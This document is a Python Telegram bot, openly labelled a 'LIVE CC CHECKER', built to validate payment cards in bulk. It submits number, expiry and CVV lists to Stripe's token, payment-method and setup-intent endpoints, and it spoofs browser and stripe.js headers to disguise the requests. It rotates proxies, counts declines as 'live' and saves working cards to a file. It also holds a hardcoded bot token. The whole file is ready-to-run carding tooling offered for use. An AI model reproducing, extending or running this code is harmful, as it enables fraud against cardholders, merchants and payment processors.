#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import re
import time
import random
import asyncio
from datetime import datetime

# ============================================
# ===== CONFIGURATION - CHANGE THIS =====
# ============================================
BOT_TOKEN = "8704774110:AAFJPYlABcjvkaOI3ZhNV68I0JW7cQDJaA0"  # CHANGE THIS
ADMIN_IDS = [8279891640]  # CHANGE THIS

# ============================================
# ===== IMPORTS - V20+ ONLY =====
# ============================================
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
    print("✅ Telegram v20+ loaded")
except ImportError:
    print("❌ Telegram not installed!")
    sys.exit(1)

try:
    import aiohttp
    print("✅ aiohttp loaded")
except:
    print("❌ aiohttp not installed!")
    sys.exit(1)

# ============================================
# ===== AUTO FILE CREATION =====
# ============================================
def create_files():
    files = {
        "settings.json": {
            "check_delay": 1,
            "use_proxy": False,
            "publishable_key": "pk_test_6pRNASwBm5c7sQ5Yd6YKuQ5k",
            "save_live": True,
            "save_dead": True
        },
        "results.json": {
            "total": 0,
            "live": 0,
            "dead": 0,
            "unknown": 0
        },
        "cards.txt": "",
        "live.txt": "",
        "dead.txt": "",
        "checked.txt": "",
        "proxies.txt": "# Add proxies here (ip:port)\n"
    }
    
    for filename, content in files.items():
        if not os.path.exists(filename):
            with open(filename, 'w') as f:
                if filename.endswith('.json'):
                    json.dump(content, f, indent=2)
                else:
                    f.write(content)
            print(f"✅ Created: {filename}")

# ============================================
# ===== DATA MANAGEMENT =====
# ============================================
def load_json(file, default=None):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def load_settings():
    return load_json("settings.json", {"check_delay": 1, "use_proxy": False})

def save_settings(settings):
    save_json("settings.json", settings)

def load_cards():
    try:
        with open("cards.txt", 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except:
        return []

def save_cards(cards):
    with open("cards.txt", 'w') as f:
        f.write('\n'.join(cards))

def save_live_card(card_info):
    with open("live.txt", 'a') as f:
        f.write(f"{card_info}\n")

def save_dead(card_info):
    with open("dead.txt", 'a') as f:
        f.write(f"{card_info}\n")

def save_checked(card_info):
    with open("checked.txt", 'a') as f:
        f.write(f"{card_info}\n")

def load_results():
    return load_json("results.json", {"total": 0, "live": 0, "dead": 0, "unknown": 0})

def save_results(results):
    save_json("results.json", results)

def load_proxies():
    try:
        with open("proxies.txt", 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except:
        return []

# ============================================
# ===== STRIPE CHECKER =====
# ============================================
STRIPE_TOKEN_URL = "https://api.stripe.com/v1/tokens"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_SETUP_URL = "https://api.stripe.com/v1/setup_intents"

class LiveCardChecker:
    def __init__(self):
        self.proxies = load_proxies()
        self.results = load_results()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ]

    def get_proxy(self):
        if self.proxies and load_settings().get('use_proxy', False):
            return f"http://{random.choice(self.proxies)}"
        return None

    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'Stripe-Version': '2023-10-16'
        }

    def parse_card(self, card_str):
        card_str = card_str.strip().replace(' ', '')
        for sep in ['|', '/', ':', ',']:
            if sep in card_str:
                parts = card_str.split(sep)
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    if 13 <= len(number) <= 19 and 1 <= len(month) <= 2 and 2 <= len(year) <= 4 and 3 <= len(cvv) <= 4:
                        if len(year) == 2:
                            year = f"20{year}"
                        return {'number': number, 'month': month.zfill(2), 'year': year, 'cvv': cvv}
        return None

    async def check_card(self, card_str):
        card = self.parse_card(card_str)
        if not card:
            return {'status': 'error', 'message': '❌ Invalid format!\nUse: number|month|year|cvv'}
        
        pk = load_settings().get('publishable_key', "pk_test_6pRNASwBm5c7sQ5Yd6YKuQ5k")
        
        result = await self.check_token(card, pk)
        if result['status'] == 'unknown':
            result = await self.check_payment_method(card, pk)
        if result['status'] == 'unknown':
            result = await self.check_setup_intent(card, pk)
        
        result['card'] = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        result['number'] = card['number'][:6] + '******' + card['number'][-4:]
        result['expiry'] = f"{card['month']}/{card['year']}"
        result['cvv'] = card['cvv']
        
        self.results['total'] += 1
        if result['status'] == 'live':
            self.results['live'] += 1
            save_live_card(f"{result['card']} | {result.get('brand', 'Unknown')}")
        elif result['status'] == 'dead':
            self.results['dead'] += 1
            save_dead(result['card'])
        else:
            self.results['unknown'] += 1
        
        save_results(self.results)
        save_checked(result['card'])
        return result

    async def check_token(self, card, pk):
        data = {
            "card[number]": card['number'],
            "card[exp_month]": card['month'],
            "card[exp_year]": card['year'],
            "card[cvc]": card['cvv'],
            "key": pk,
            "payment_user_agent": "stripe.js/1.0",
            "time_on_page": str(random.randint(1000, 5000))
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(STRIPE_TOKEN_URL, data=data, headers=self.get_headers(), 
                                       proxy=self.get_proxy(), timeout=15) as response:
                    text = await response.text()
                    if '"id"' in text and '"tok_' in text:
                        brand = re.search(r'"brand":"([^"]+)"', text)
                        return {'status': 'live', 'message': '🔥 LIVE CARD!', 'brand': brand.group(1) if brand else 'Unknown'}
                    elif '"error"' in text:
                        code = re.search(r'"code":"([^"]+)"', text)
                        code = code.group(1) if code else ''
                        if code in ['incorrect_cvc', 'invalid_cvc', 'card_declined']:
                            return {'status': 'live', 'message': '🔥 LIVE CARD!'}
                        elif code in ['expired_card', 'incorrect_number', 'invalid_number']:
                            return {'status': 'dead', 'message': '❌ DEAD'}
                    return {'status': 'unknown', 'message': '⚠️ UNKNOWN'}
        except:
            return {'status': 'unknown', 'message': '⚠️ ERROR'}

    async def check_payment_method(self, card, pk):
        data = {
            "type": "card",
            "card[number]": card['number'],
            "card[exp_month]": card['month'],
            "card[exp_year]": card['year'],
            "card[cvc]": card['cvv'],
            "key": pk
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(STRIPE_PM_URL, data=data, headers=self.get_headers(),
                                       proxy=self.get_proxy(), timeout=15) as response:
                    text = await response.text()
                    if '"id"' in text and '"pm_' in text:
                        return {'status': 'live', 'message': '🔥 LIVE CARD!'}
                    elif '"error"' in text:
                        if 'card_declined' in text:
                            return {'status': 'live', 'message': '🔥 LIVE CARD!'}
                        elif 'expired_card' in text:
                            return {'status': 'dead', 'message': '❌ DEAD'}
                    return {'status': 'unknown', 'message': '⚠️ UNKNOWN'}
        except:
            return {'status': 'unknown', 'message': '⚠️ ERROR'}

    async def check_setup_intent(self, card, pk):
        data = {
            "payment_method_types[]": "card",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card['number'],
            "payment_method_data[card][exp_month]": card['month'],
            "payment_method_data[card][exp_year]": card['year'],
            "payment_method_data[card][cvc]": card['cvv'],
            "key": pk
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(STRIPE_SETUP_URL, data=data, headers=self.get_headers(),
                                       proxy=self.get_proxy(), timeout=15) as response:
                    text = await response.text()
                    if '"id"' in text and '"seti_' in text:
                        return {'status': 'live', 'message': '🔥 LIVE CARD!'}
                    elif '"error"' in text:
                        if 'card_declined' in text:
                            return {'status': 'live', 'message': '🔥 LIVE CARD!'}
                        elif 'expired_card' in text:
                            return {'status': 'dead', 'message': '❌ DEAD'}
                    return {'status': 'unknown', 'message': '⚠️ UNKNOWN'}
        except:
            return {'status': 'unknown', 'message': '⚠️ ERROR'}

# ============================================
# ===== BOT HANDLERS =====
# ============================================
checker = LiveCardChecker()

async def start(update: Update, context):
    text = f"""
🔥 **LIVE CC CHECKER BOT**

**Commands:**
`/chk [card]` - Check single card
`/mass` - Check all cards
`/mtxt` - Upload .txt file
`/stats` - Show statistics
`/add [card]` - Add card to queue
`/list` - Show card list
`/live` - Show live cards
`/dead` - Show dead cards
`/clear` - Clear queue
`/settings` - Bot settings

📊 **Stats:**
🔥 Live: {checker.results['live']}
❌ Dead: {checker.results['dead']}
⚠️ Unknown: {checker.results['unknown']}
"""
    keyboard = [
        [InlineKeyboardButton("🔥 Check", callback_data="check")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def chk_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: `/chk 4111111111111111|12|2026|123`", parse_mode="Markdown")
        return
    
    msg = await update.message.reply_text("🔥 Checking...")
    result = await checker.check_card(' '.join(args))
    
    if result['status'] == 'error':
        response = result['message']
    else:
        emoji = "🔥" if result['status'] == 'live' else "❌" if result['status'] == 'dead' else "⚠️"
        response = f"""
🔍 **Result**

💳 `{result.get('number', 'Unknown')}`
📅 {result.get('expiry', 'N/A')}
🔐 `{result.get('cvv', 'N/A')}`

📊 {emoji} {result['message']}
"""
        if result['status'] == 'live' and 'brand' in result:
            response += f"\n🏷️ {result['brand']}"
    
    await msg.edit_text(response, parse_mode="Markdown")

async def mass_command(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    cards = load_cards()
    if not cards:
        await update.message.reply_text("❌ No cards!")
        return
    
    msg = await update.message.reply_text(f"🔥 Checking {len(cards)} cards...")
    live, dead, unknown = 0, 0, 0
    
    for i, card in enumerate(cards):
        result = await checker.check_card(card)
        if result['status'] == 'live': live += 1
        elif result['status'] == 'dead': dead += 1
        else: unknown += 1
        
        if i % 5 == 0:
            await msg.edit_text(f"🔄 {i+1}/{len(cards)}\n🔥 {live} | ❌ {dead} | ⚠️ {unknown}")
        await asyncio.sleep(load_settings().get('check_delay', 1))
    
    save_cards([])
    await msg.edit_text(f"✅ Complete!\n🔥 Live: {live}\n❌ Dead: {dead}\n⚠️ Unknown: {unknown}", parse_mode="Markdown")

async def mtxt_command(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    await update.message.reply_text("📤 Send .txt file")
    context.user_data['waiting_for_file'] = True

async def handle_file(update: Update, context):
    if not context.user_data.get('waiting_for_file'):
        return
    
    doc = update.message.document
    if not doc:
        await update.message.reply_text("❌ Send .txt file!")
        return
    
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive('temp.txt')
    
    with open('temp.txt', 'r') as f:
        cards = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    os.remove('temp.txt')
    if not cards:
        await update.message.reply_text("❌ No cards!")
        return
    
    existing = load_cards()
    existing.extend(cards)
    save_cards(existing)
    context.user_data['waiting_for_file'] = False
    await update.message.reply_text(f"✅ Added {len(cards)} cards! Total: {len(existing)}")

async def add_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: /add 411111|12|2026|123")
        return
    
    cards = load_cards()
    cards.append(' '.join(args))
    save_cards(cards)
    await update.message.reply_text(f"✅ Added! Total: {len(cards)}")

async def list_command(update: Update, context):
    cards = load_cards()
    if not cards:
        await update.message.reply_text("📭 No cards!")
        return
    
    text = f"📦 {len(cards)} cards\n\n"
    for i, card in enumerate(cards[:20], 1):
        masked = re.sub(r'(\d{6})\d+(\d{4})', r'\1******\2', card)
        text += f"{i}. {masked}\n"
    await update.message.reply_text(text)

async def stats_command(update: Update, context):
    cards = load_cards()
    text = f"""
📊 **Stats**
🔥 Live: {checker.results['live']}
❌ Dead: {checker.results['dead']}
⚠️ Unknown: {checker.results['unknown']}
📦 Total: {checker.results['total']}
📝 Queue: {len(cards)}
"""
    await update.message.reply_text(text)

async def live_command(update: Update, context):
    try:
        with open("live.txt", 'r') as f:
            live = [line.strip() for line in f if line.strip()]
    except:
        live = []
    
    if not live:
        await update.message.reply_text("📭 No live cards!")
        return
    
    text = f"🔥 **LIVE** ({len(live)})\n\n"
    for card in live[:20]:
        text += f"• {card}\n"
    await update.message.reply_text(text)

async def dead_command(update: Update, context):
    try:
        with open("dead.txt", 'r') as f:
            dead = [line.strip() for line in f if line.strip()]
    except:
        dead = []
    
    if not dead:
        await update.message.reply_text("📭 No dead cards!")
        return
    
    text = f"❌ **DEAD** ({len(dead)})\n\n"
    for card in dead[:20]:
        text += f"• {card}\n"
    await update.message.reply_text(text)

async def clear_command(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    save_cards([])
    await update.message.reply_text("🗑️ Cleared!")

async def settings_command(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    settings = load_settings()
    text = f"""
⚙️ **Settings**
⏱️ Delay: {settings.get('check_delay', 1)}s
🌐 Proxy: {'✅' if settings.get('use_proxy', False) else '❌'}
"""
    await update.message.reply_text(text)

async def set_delay(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: /setdelay 1")
        return
    
    settings = load_settings()
    settings['check_delay'] = float(args[0])
    save_settings(settings)
    await update.message.reply_text(f"✅ Delay: {args[0]}s")

async def toggle_proxy(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    settings = load_settings()
    settings['use_proxy'] = not settings.get('use_proxy', False)
    save_settings(settings)
    await update.message.reply_text(f"✅ Proxy {'enabled' if settings['use_proxy'] else 'disabled'}")

async def set_key(update: Update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: /setkey pk_test_xxx")
        return
    
    settings = load_settings()
    settings['publishable_key'] = args[0]
    save_settings(settings)
    await update.message.reply_text("✅ Key updated!")

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "check":
        await query.message.reply_text("💳 Use: /chk 4111111111111111|12|2026|123")
    elif query.data == "stats":
        await stats_command(update, context)

async def error_handler(update: Update, context):
    print(f"Error: {context.error}")

# ============================================
# ===== MAIN =====
# ============================================
def main():
    print("🔥 Starting LIVE CC Checker Bot...")
    create_files()
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("\n❌ ERROR: Set BOT_TOKEN in bot.py!")
        return
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("chk", chk_command))
        application.add_handler(CommandHandler("mass", mass_command))
        application.add_handler(CommandHandler("mtxt", mtxt_command))
        application.add_handler(CommandHandler("add", add_command))
        application.add_handler(CommandHandler("list", list_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("live", live_command))
        application.add_handler(CommandHandler("dead", dead_command))
        application.add_handler(CommandHandler("clear", clear_command))
        application.add_handler(CommandHandler("settings", settings_command))
        application.add_handler(CommandHandler("setdelay", set_delay))
        application.add_handler(CommandHandler("toggleproxy", toggle_proxy))
        application.add_handler(CommandHandler("setkey", set_key))
        
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_error_handler(error_handler)
        
        print("\n✅ Bot is ready! Starting polling...")
        application.run_polling()
        
    except Exception as e:
        print(f"\n❌ Error: {e}")

if __name__ == "__main__":
    main()